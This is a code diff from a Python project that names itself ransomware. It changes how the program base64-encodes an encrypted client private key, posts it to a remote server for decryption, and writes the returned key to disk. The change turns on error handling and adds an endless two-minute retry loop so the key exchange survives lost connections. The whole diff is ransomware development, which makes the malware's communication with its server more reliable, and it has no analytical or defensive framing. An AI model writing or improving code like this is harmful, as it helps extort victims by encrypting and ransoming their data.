@@ -43,12 +43,10 @@ def shred(file_name,  passes=1):
 def send_to_server_encrypted_private_key(id, private_encrypted_key):
     
     # do something with id later 
-    #try:
-    ret = requests.post(server_address, data=private_encrypted_key)
-    print('pass')
-    #except Exception as e:
-     #   print(e)
-      #  raise e
+    try:
+        ret = requests.post(server_address, data=private_encrypted_key)
+    except Exception as e:
+        raise e
 
     print("key decrypted")
 
@@ -69,13 +67,13 @@ def menu():
     key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))
 
     # send to server to be decrypted
-    #while True:
-        #try:
-    client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
-        #    break
-        #except:
-      #      print("No connection, sleeping for 2 minutes")
-     #       time.sleep(2)
+    while True:
+        try:
+            client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
+            break
+        except:
+            print("No connection, sleeping for 2 minutes")
+            time.sleep(120)
 
     # saving to disk the private key
     with open(ransomware_path + "/client_private_key.PEM", 'wb') as f:
